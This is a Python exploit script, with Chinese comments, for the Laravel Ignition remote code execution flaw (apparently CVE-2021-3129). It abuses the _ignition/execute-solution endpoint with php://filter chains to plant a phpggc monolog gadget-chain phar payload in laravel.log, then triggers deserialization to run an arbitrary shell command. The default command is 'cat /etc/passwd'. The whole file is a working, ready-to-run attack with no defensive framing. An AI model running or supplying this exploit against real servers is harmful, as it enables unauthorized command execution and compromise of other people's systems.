#!/usr/bin/python3

import requests as req
import os, uuid


class Exp:
    __gadget_chains = {
        "monolog_rce1": r""" php -d 'phar.readonly=0' phpggc/phpggc monolog/rce1 system %s --phar phar -o php://output | base64 -w0 | python -c "import sys;print(''.join(['=' + hex(ord(i))[2:].zfill(2) + '=00' for i in sys.stdin.read()]).upper())" > payload.txt""",
        "monolog_rce2": r""" php -d 'phar.readonly=0' phpggc/phpggc monolog/rce2 system %s --phar phar -o php://output | base64 -w0 | python -c "import sys;print(''.join(['=' + hex(ord(i))[2:].zfill(2) + '=00' for i in sys.stdin.read()]).upper())" > payload.txt""",
        "monolog_rce3": r""" php -d 'phar.readonly=0' phpggc/phpggc monolog/rce3 system %s --phar phar -o php://output | base64 -w0 | python -c "import sys;print(''.join(['=' + hex(ord(i))[2:].zfill(2) + '=00' for i in sys.stdin.read()]).upper())" > payload.txt""",
    }  # phpggc链集合，暂时添加rce1后续再添加其他增强通杀能力

    __delimiter_len = 8  # 定界符长度

    def __vul_check(self):
        resp = req.get(self.__url, verify=False)
        if resp.status_code != 405 and "laravel" not in resp.text:
            return False
        return True

    def __payload_send(self, payload):
        header = {
            "Accept": "application/json"
        }
        data = {
            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
            "parameters": {
                "variableName": "cve20213129",
                "viewFile": ""
            }
        }
        data["parameters"]["viewFile"] = payload
        resp = req.post(self.__url, headers=header, json=data, verify=False)
        # print(resp.text)
        return resp

    def __command_handler(self, command):
        """
        因为用户命令要注入到payload生成的命令中，为了防止影响结构，所以进行一些处理。
        """

        self.__delimiter = str(uuid.uuid1())[:self.__delimiter_len]  # 定界符用于定位页面中命令执行结果的位置。
        # print(delimiter)
        command = "echo %s && %s && echo %s" % (self.__delimiter, command, self.__delimiter)
        # print(command)

        escaped_chars = [' ', '&', '|']  # 我只想到这么多，可自行添加。
        for c in escaped_chars:
            command = command.replace(c, '\\' + c)
        # print(command)
        return command

    def __clear_log(self):
        return self.__payload_send(
            "php://filter/write=convert.iconv.utf-8.utf-16le|convert.quoted-printable-encode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log")

    def __gen_payload(self, gadget_chain):
        gen_shell = self.__gadget_chains[gadget_chain] % (self.__command)
        # print(gen_shell)
        os.system(gen_shell)
        with open('payload.txt', 'r') as f:
            payload = f.read().replace('\n', '') + 'a'  # 添加一个字符使得两个完整的payload总是只有一个可以正常解码
        os.system("rm payload.txt")
        # print(payload)
        return payload

    def __decode_log(self):
        return self.__payload_send(
            "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log")

    def __unserialize_log(self):
        return self.__payload_send("phar://../storage/logs/laravel.log/test.txt")

    def __rce(self):
        text = self.__unserialize_log().text
        # print(text)

        echo_find = text.find(self.__delimiter)
        # print(echo_find)
        if echo_find >= 0:
            return text[echo_find + self.__delimiter_len + 1: text.find(self.__delimiter, echo_find + 1)]
        else:
            return "[-] RCE echo is not found."

    def exp(self):
        for gadget_chain in self.__gadget_chains.keys():
            print("[*] Try to use %s for exploitation." % (gadget_chain))
            self.__clear_log()
            self.__clear_log()
            self.__payload_send('a' * 2)
            self.__payload_send(self.__gen_payload(gadget_chain))
            self.__decode_log()
            print("[*] Result:")
            print(self.__rce())

    def __init__(self, target, command):
        self.target = target
        self.__url = req.compat.urljoin(target, "_ignition/execute-solution")
        self.__command = self.__command_handler(command)
        if not self.__vul_check():
            print("[-] [%s] is seems not vulnerable." % (self.target))
            print("[*] You can also call obj.exp() to force an attack.")
        else:
            self.exp()


def main():
    Exp("http://127.0.0.1:8888", "cat /etc/passwd")


if __name__ == '__main__':
    main()
